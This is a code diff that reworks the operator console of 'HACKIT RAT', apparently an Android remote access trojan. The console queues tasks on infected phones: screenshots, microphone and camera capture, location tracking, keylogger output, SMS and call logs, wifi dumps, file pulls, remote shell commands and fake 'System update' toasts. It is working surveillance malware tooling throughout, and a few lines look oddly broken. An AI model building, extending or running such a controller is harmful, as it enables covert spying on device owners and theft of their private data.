@@ -12,6 +12,7 @@ import os
 import shutil
 import threading
 import time
+import json
 from typing import Dict, List, Optional
 
 from hackit.ui import _colored, B_CYAN, B_GREEN, B_MAGENTA, B_RED, B_WHITE, B_YELLOW, DIM, GREEN
@@ -36,18 +37,12 @@ KIND_COLOR = {
 }
 
 HELP = [
-    ("1-9 / j k", "select session"),
-    ("s / m / c", "screenshot / mic 15s / photo"),
-    ("i", "device info"),
-    ("l", "one location fix"),
-    ("g", "drain keylogger"),
-    ("a", "installed apps"),
-    ("f <path>", "list a directory"),
-    ("p <path>", "pull a file"),
-    ("x <cmd>", "run a shell command"),
-    ("v", "start screen stream (live frame URL)"),
-    ("r", "force refresh"),
-    ("q", "quit"),
+    ("session", "1-9 select · j/k next/prev · Space refresh · Enter open detail"),
+    ("capture", "s screenshot · m mic 15s · c camera · v live screen stream"),
+    ("intel", "i info · l locate · g keylog · a apps · u usage · w wifi"),
+    ("files", "f <dir> list · p <path> pull"),
+    ("control", "x <cmd> shell · t <ms> toast · b buzz"),
+    ("misc", "r refresh · h help · q quit (Ctrl-C also)"),
 ]
 
 
@@ -68,6 +63,9 @@ class LiveUI:
         self.started = time.time()
         self.width = 100
         self.height = 30
+        self.helping = False
+        self.last_frame: Optional[str] = None
+        self.flash: Optional[str] = None
 
     # ------------------------------------------------------------- server
     def _serve(self) -> None:
@@ -100,6 +98,7 @@ class LiveUI:
     def refresh(self) -> None:
         store.mark_offline(self.hub.offline_after)
         self.sessions = store.sessions()
+        self.sessions.sort(key=lambda r: (not r["online"], -r["last_seen"]))
         session = self.current()
         if not session:
             return
@@ -117,16 +116,19 @@ class LiveUI:
                 if task.get("output"):
                     self.feed.append((time.strftime("%H:%M:%S"), "out:" + task["cmd"],
                                       _compact(task["output"], 200)))
-        for row in store.keylogs(sid, 0, 200)[-12:]:
+        for row in store.keylogs(sid, 0, 200)[-40:]:
             line = f"[{row['package']}] {row['text']}"
             if line not in self.keys:
                 self.keys.append(line)
-        del self.keys[:-14]
+        del self.keys[:-40]
 
     def queue(self, cmd: str, args: Optional[List[str]] = None) -> None:
         session = self.current()
         if not session:
             self.message = "no session"
+            return
+        if not protocol.allowed(cmd, _spec_modules(session)):
+            self.message = f"{cmd} not in spec '{session.get('spec', 'rat')}'"
             return
         try:
             task_id = store.queue_task(session["sid"], cmd, args or [])
@@ -137,69 +139,115 @@ class LiveUI:
         self.message = f"queued #{task_id} {cmd}"
 
     # ------------------------------------------------------------- render
+    def _box(self, title: str, rows: List[str], width: int, color: str, rows_needed: int) -> List[str]:
+        head = f" {title} "
+        top = _colored("┌" + head.ljust(width - 2, "─") + "┐", color)
+        out = [top]
+        for i in range(rows_needed):
+            body = rows[i] if i < len(rows) else ""
+            out.append(_colored("│ ", color) + _pad(body, width - 4) + _colored(" │", color))
+        out.append(_colored("└" + "─" * (width - 2) + "┘", color))
+        return out
+
     def render(self) -> str:
-        size = shutil.get_terminal_size((100, 30))
-        self.width = max(72, min(size.columns, 200))
-        self.height = max(18, size.lines)
-        width = self.width
+        size = shutil.get_terminal_size((110, 32))
+        self.width = max(80, min(size.columns, 200))
+        self.height = max(24, min(size.lines, 50))
+        width = self.height and self.width
         session = self.current()
-        header = (
-            f" HACKIT RAT · {self.hub.public_url} · up {int(time.time() - self.started)}s "
-            f"· {sum(1 for s in self.sessions if s['online'])}/{len(self.sessions)} online"
-        )
-        left_w = 30
-        right_w = width - left_w - 3
-        lines: List[str] = [_colored(header, B_CYAN), _colored("─" * width, DIM)]
 
-        left: List[str] = []
-        for i, row in enumerate(self.sessions[:9]):
-            mark = _colored("▸", B_GREEN) if i == self.index else " "
+        uptime = int(time.time() - self.started)
+        online = sum(1 for s in self.sessions if s["online"])
+        head_l = _colored(" ● HACKIT RAT ", B_RED) + _colored(self.hub.public_url, B_CYAN)
+        head_r = (f"up {uptime//60}m{uptime%60:02d}s   "
+                  f"{_colored(str(online), GREEN if online else DIM)}/{len(self.sessions)} online   "
+                  f"{len(self.feed)} events")
+        header = _pad(head_l, self.width - _visible_len(head_r) - 2) + _colored(head_r, DIM)
+        lines = [header, _colored("═" * self.width, DIM)]
+        _ = width
+
+        if self.helping:
+            help_rows: List[str] = []
+            for group, text in HELP:
+                help_rows.append(_colored(group.ljust(9), B_CYAN) + " " + text)
+            lines += self._box("HELP — any verb also works as a raw command (e.g. sms_dump 50)",
+                                help_rows, self.width, B_CYAN, len(help_rows) + 1)
+            lines.append(_colored("  press any key to return", DIM))
+            return "\n".join(lines)
+
+        left_w = min(34, self.width // 3)
+        right_w = self.width - left_w - 4
+        session = self.current()
+
+        # left: devices
+        srows: List[str] = []
+        if not self.sessions:
+            srows.append(_colored("waiting for the first beacon…", DIM))
+            srows.append(_colored("build: make app", DIM))
+            srows.append(_colored("deliver: inject / make stager", DIM))
+        for i, row in enumerate(self.sessions[:10]):
+            mark = _colored("▸", B_GREEN) if i == self.index else _colored(" ", DIM)
             dot = _colored("●", GREEN) if row["online"] else _colored("○", DIM)
-            kind = row.get("kind", "apk")[:4]
-            label = f"{mark}{dot}{kind} {row['label'][:18]:<18}"
-            left.append(label)
-            left.append(f"   {_colored((row.get('model') or '?')[:24], DIM)} {row.get('battery') or 0}%")
-        while len(left) < self.height - 10:
-            left.append("")
+            spec = (row.get("spec") or "rat")[:7]
+            srows.append(f"{mark}{dot} {_colored(spec, B_MAGENTA)} {row['label'][:16]}")
+            batt = int(row.get("battery") or 0)
+            model = (row.get("model") or "?")[:20]
+            bar = "█" * max(1, batt // 14) if batt else "▏"
+            srows.append(f"   {_colored(model, DIM)} {bar} {batt}%{'+⚡' if row.get('charging') else ''}")
+        lines += self._box("DEVICES", srows, left_w, B_CYAN, self.height - 9)
 
-        right: List[str] = [_colored("FEED", B_WHITE)]
-        for stamp, kind, body in self.feed[-9:]:
+        # middle: live feed
+        feed_rows: List[str] = []
+        if not self.feed:
+            feed_rows.append(_colored("waiting for events…", DIM))
+        for stamp, kind, body in self.feed[-(self.height - 13):]:
             color = KIND_COLOR.get(kind, DIM)
-            right.append(f"{_colored(stamp, DIM)} {_colored(kind[:7].ljust(7), color)} {_clip(body, right_w - 18)}")
-        right.append("")
-        right.append(_colored("KEYS", B_WHITE))
-        for line in self.keys[-4:]:
-            right.append(_clip(line, right_w))
-        while len(right) < self.height - 10:
-            right.append("")
+            feed_rows.append(f"{_colored(stamp, DIM)} {_colored(kind[:6].ljust(6), color)} {_clip(_summarize(kind, body), right_w - 16)}")
+        lines += self._box("LIVE FEED", feed_rows, right_w, B_WHITE, self.height - 13)
 
-        body = self.height - 8
-        for row in range(body):
-            left_line = _pad(left[row] if row < len(left) else "", left_w - 1)
-            right_line = _pad(right[row] if row < len(right) else "", right_w)
-            lines.append(left_line + " │ " + right_line)
+        lines.append(_colored("─" * self.width, DIM))
 
-        lines.append(_colored("─" * width, DIM))
+        # bottom: keystrokes + status
+        if session:
+            keys_title = f"KEYSTROKES · {session['label'][:12]}"
+        else:
+            keys_title = "KEYSTROKES"
+        key_rows: List[str] = []
+        if not self.keys:
+            key_rows.append(_colored("no keystrokes captured yet", DIM))
+        for line in self.keys[-6:]:
+            key_rows.append(_clip(line, self.width // 2 - 4))
+        lines += self._box(keys_title, key_rows, self.width // 2, B_MAGENTA, 8)
+
+        stat_rows: List[str] = []
         if session:
             loc = store.locations(session["sid"], 1)
-            tasks = store.tasks(session["sid"], 4)
-            info = (
-                f" {session['sid'][:14]} {session.get('model') or '?'} · sdk {session.get('sdk')} · "
-                f"{session.get('battery') or 0}% · {session.get('pub_ip') or '-'}"
-            )
+            tasks = store.tasks(session["sid"], 5)
+            stat_rows.append(f"{_colored('sid', DIM)} {session['sid'][:18]}  "
+                             f"{_colored('ip', DIM)} {session.get('pub_ip') or '-'}  "
+                             f"{_colored('sdk', DIM)} {session.get('sdk')}")
             if loc:
-                info += f" · {_colored(f'{loc[0]['lat']:.4f},{loc[0]['lon']:.4f}', GREEN)}"
+                stat_rows.append(f"{_colored('fix', DIM)} {loc[0]['lat']:.4f}, {loc[0]['lon']:.4f} "
+                                 f"±{int(loc[0]['accuracy'] or 0)}m {loc[0]['provider']}")
+            else:
+                stat_rows.append(f"{_colored('fix', DIM)} —")
             if tasks:
-                info += " · " + " ".join(f"{t['cmd']}:{t['state'][:3]}" for t in tasks)
-            lines.append(_clip(info, width - 2))
+                stat_rows.append(" ".join(f"{_colored(t['cmd'], B_WHITE)}:{t['state'][:4]}" for t in tasks))
+            if self.last_frame:
+                stat_rows.append(f"{_colored('screen', DIM)} {_clip(self.last_frame, self.width // 2 - 20)}")
         else:
-            lines.append(_colored(" no sessions — build and install an apk first", DIM))
-        if self.message:
-            lines.append(_colored(" " + self.message, B_YELLOW))
+            stat_rows.append(_colored("select a device with 1-9 to see status", DIM))
+        lines += self._box("STATUS", stat_rows, self.width - self.width // 2 - 2, B_CYAN, 8)
+
+        # footer
+        if self.flash:
+            lines.append(_colored(" ► " + self.flash, B_YELLOW))
+            self.flash = None
+        elif self.message:
+            lines.append(_colored(" ► " + self.message, B_YELLOW))
             self.message = ""
         else:
-            lines.append("")
-        lines.append(_colored(" help · 1-9 select · s/m/c · i l g a f p x · q ", DIM))
+            lines.append(_colored(" ► ", DIM) + _colored("h help · q quit", DIM))
         return "\n".join(lines)
 
     # -------------------------------------------------------------- input
@@ -212,10 +260,8 @@ class LiveUI:
         args = parts[1:]
         if verb in ("q", "quit", "exit"):
             return False
-        if verb in ("help", "?"):
-            for name, desc in HELP:
-                self.message = self.message
-                print(f"  {name:<14} {desc}")
+        if verb in ("help", "?", "h"):
+            self.helping = True
             return True
         if verb in ("j", "k") or verb.isdigit():
             if verb == "j":
@@ -225,6 +271,9 @@ class LiveUI:
             else:
                 self.index = max(0, min(int(verb) - 1, len(self.sessions) - 1))
             self.refresh()
+            return True
+        if verb == "h" or verb == "help" or verb == "?":
+            self.helping = not self.helping
             return True
         if verb == "s":
             self.queue("screenshot")
@@ -246,11 +295,19 @@ class LiveUI:
             self.queue("files_pull", [" ".join(args)])
         elif verb == "x":
             self.queue("shell", [" ".join(args)])
+        elif verb == "u":
+            self.queue("usage", ["7"])
+        elif verb == "w":
+            self.queue("wifi_dump")
+        elif verb == "t":
+            self.queue("toast", [" ".join(args) or "System update"])
+        elif verb == "b":
+            self.queue("vibrate", ["600"])
         elif verb == "v":
             self.queue("screen_start")
             session = self.current()
             if session:
-                self.message = f"live: {self.hub.public_url}/v1/live/{session['sid']}"
+                self.last_frame = f"{self.hub.public_url}/v1/live/{session['sid']}"
         elif verb == "r":
             self.refresh()
         else:
@@ -304,8 +361,7 @@ class LiveUI:
                     if char == "\x1b":
                         continue
                     buffer = (buffer + char)[:120]
-                os.write(1, f"\x1b[{self.height};1H\x1b[2K ".encode())
-                os.write(1, buffer.encode("utf-8", "replace"))
+                os.write(1, f"\x1b[{self.height + 4};1H\x1b[2K rat> {buffer}".encode())
         except KeyboardInterrupt:
             pass
         finally:
@@ -334,6 +390,45 @@ def _visible_len(text: str) -> int:
         total += 1
         index += 1
     return total
+
+
+def _summarize(kind: str, body: str) -> str:
+    """One readable line per event kind, no raw JSON walls."""
+    try:
+        data = json.loads(body)
+    except Exception:
+        return _compact(body, 300)
+    if kind == "sms" and isinstance(data, list):
+        out = []
+        for row in data[:2]:
+            out.append(f"{row.get('from','?')}: {row.get('body','')}")
+        return " | ".join(out)
+    if kind == "call" and isinstance(data, list):
+        out = []
+        for row in data[:2]:
+            out.append(f"{row.get('number','?')} ({row.get('name','') or 'unknown'}) {row.get('duration',0)}s")
+        return " | ".join(out)
+    if kind == "loc" and isinstance(data, list) and data:
+        row = data[0]
+        return f"{row.get('lat')},{row.get('lon')} ±{row.get('acc','?')} {row.get('src','')}"
+    if kind == "keylog" and isinstance(data, list):
+        return " ".join(str(r.get("text","")) for r in data[:3] if isinstance(r, dict))
+    if kind == "notif" and isinstance(data, dict):
+        return f"{data.get('pkg','')}: {data.get('title','')} {data.get('text','')}".strip()
+    if kind == "clip":
+        text = data.get("text") if isinstance(data, dict) else data
+        return str(text)[:200]
+    if isinstance(data, dict):
+        for key in ("name", "path", "pkg", "cmd"):
+            if key in data:
+                return str(data[key])
+    return _compact(body, 300)
+
+
+def _spec_modules(session: dict) -> Optional[List[str]]:
+    spec = session.get("spec") or "rat"
+    from . import builder
+    return sorted(set(builder.CORE_MODULES + builder.SPECS.get(spec, [])))
 
 
 def _compact(body: str, limit: int) -> str:
